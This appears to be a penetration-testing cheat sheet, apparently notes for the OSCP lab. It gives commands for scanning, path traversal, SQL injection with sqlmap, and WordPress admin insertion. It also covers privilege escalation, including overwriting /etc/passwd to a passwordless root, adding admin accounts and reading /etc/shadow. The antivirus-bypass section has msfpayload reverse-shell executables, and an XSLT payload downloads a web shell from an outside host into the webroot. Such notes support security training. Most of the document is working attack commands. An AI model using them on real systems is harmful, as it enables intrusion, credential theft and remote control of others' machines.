# Useful command

## Scan

### NMAP
```
nmap -A -Pn -n --top-ports 10000 -vvv -oN 192.168.27.68
nmap -sV -T5 -F -A 10.11.1.5 --open --script vuln
nmap -A -Pn -sC 10.11.1.8
nmap 10.11.1.31 -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=poiuytrewq,mssql.instance-name=MSSQLSERVER,ms-sql-xp-cmdshell.cmd='type C:\"Documents and Settings"\Administrator\Desktop\proof.txt'
nmap 10.11.1.125 --script ftp*
```
### NIKTO
```
nikto -h 10.10.10.10:8000
```

### DIRBUSTER
```
dirb http://10.11.1.31
```

### SMB
```
enum4linux 10.11.1.8
smbclient //10.11.1.128/wwwroot
smbclient -L 10.11.1.128
```

### FTP
```
anonymous:anonymous
cd "Documents and Settings"
get servers.py

ls ../../../../../../../../../../../Docume~1/Administrateur/Bureau/
get
(remote-file) ../../../../../../../../../../../Docume~1/Administrateur/Bureau/proof.txt
(local-file) /root/Desktop/10.11.1.125.txt
```

### WORDPRESS

```
wpscan -u "http://10.11.1.234" --wordlist /usr/share/wordlists/rockyou.txt --username admin
```

## Get Shell & Listen:

https://github.com/emre-uzun/oscp/blob/master/Shell/Generating-Reverse-Shell.md

***

## Exploitation

### LFI

oneExample:
GET /../../../../xampp\php\extras\browscap.ini
GET /../../../../xampp/htdocs/blog/wp-config.php


### DB

#### Connect MariaDB
mysql -u root 10.10.10.10 -p Password@1

SQL Query for Wordpress:
```
INSERT INTO `databasename`.`wp_users` (`ID`, `user_login`, `user_pass`, `user_nicename`, `user_email`, `user_url`, `user_registered`, `user_activation_key`, `user_status`, `display_name`) VALUES ('4', 'demo', MD5('demo'), 'Your Name', 'test@yourdomain.com', 'http://www.test.com/', '2011-06-07 00:00:00', '', '0', 'Your Name');
 
 
INSERT INTO `databasename`.`wp_usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, '4', 'wp_capabilities', 'a:1:{s:13:"administrator";s:1:"1";}');
 
 
INSERT INTO `databasename`.`wp_usermeta` (`umeta_id`, `user_id`, `meta_key`, `meta_value`) VALUES (NULL, '4', 'wp_user_level', '10');
```

#### SQLMAP
```
sqlmap -r req2.txt --risk=3 --level=5 -p csid --dbms="MySQL" --dbs
sqlmap -r req2.txt --risk=3 --level=5 -p csid --dbms="MySQL" --tables -D cscart
sqlmap -r req2.txt --risk=3 --level=5 -p csid --dbms="MySQL" --columns -D cscart -T cscart_users
sqlmap -r req2.txt --risk=3 --level=5 -p csid --dbms="MySQL" --dump -D cscart -T cscart_users
```



***

## PRIVILAGE ESCALATION

### C Compile

linux:
> gcc -o hello hello.c

windows 32 bit:
> i686-w64-mingw32-gcc -o hello.exe hello.c

windows 64 bit:
> x86_64-w64-mingw32 -o hello.exe hello.c

### File Transfer

Attacker machine

> python -m SimpleHTTPServer 8000

> python3 -m http.server 8000

Cadaver

```
cadaver http://10.11.1.13/scripts/
put /root/Desktop/shellLER/phpReverseShell/aspunstage.aspx
```

CURL

```
curl -X MOVE --header    "Destination:http://10.11.1.13/scripts/aspunstaged.asp" "http://10.11.1.13/scripts/aspunstaged.aspx"
```

Windows Commands:
> net user hacker hacker /add 
> net localgroup administrators IWAM_BOB /add

Linux Commands:
> cat /etc/issue
> uname -a
> cat /proc/version
> find / -perm -u=s -type f 2>/dev/null
> find / -perm -g=s -type f 2>/dev/null
> find / -perm -2 ! -type l -ls 2>/dev/null @Yazma yetkisi olan dosyalar
```
echo root::0:0:root:/root:/bin/bash > /etc/passwd
su
```

```
sudo nmap --interactive
!id
!cat /root/proof.txt
```

> netstat -ano
> cat config.php | grep db
> sudo -l
> run post/multi/recon/local_exploit_suggester

```
upload /root/Desktop/test/churrasco.exe C:\\Inetpub\\
shell
churrasco.exe “net user emr Password1 /add”
churrasco.exe “net localgroup Administrator emr /add”
```

> cat /etc/shadow @Normal kullanıcı göremez


## ANTIVIRUS BYPASS

Normal exploit

```
msfpayload windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 X > ~/Desktop/shell_reverse.exe
```

MSF Encoded Exploit

```
msfpayload windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 R | msfencode -e x86/shikata_ga_nai -t exe -c 9 -o ~/Desktop/shell_reverse_msf_encoded.exe
```

MSF Encoded Embedded Exploit

```
msfpayload windows/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 R | msfencode -e x86/shikata_ga_nai -t exe -c 9 -x /usr/share/windows-binaries/plink.exe -o ~/Desktop/shell_reverse_msf_encoded_embedded.exe
```

Custom Tool:

```
i586-mingw32msvc-gcc reverse.c -o ~/Desktop/custom-reverse.exe -lws2_32
```
### XXE
```
<?xml version='1.0'?>
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:msxsl="urn:schemas-microsoft-com:xslt"
xmlns:user="http://mycompany.com/mynamespace">
<msxsl:script language="C#" implements-prefix="user">
<![CDATA[
public string xml()
{
    System.Net.WebClient webClient = new System.Net.WebClient();
    webClient.DownloadFile("https://x.x.x.x/shell.aspx",
                       @"c:\inetpub\wwwroot\shell.aspx");

    return "Exploit Success";
}
]]>
</msxsl:script>
<xsl:template match="/">
<xsl:value-of select="user:xml()"/>
</xsl:template>
</xsl:stylesheet>
```

## FLAG & CAPTURE

```
whoami
ipconfig/ifconfig
type C:\"Documents and Settings"\Administrator\Desktop\proof.txt
cat /root/proof.txt
id
dir C:\ /s/b | find /i “proof.txt”
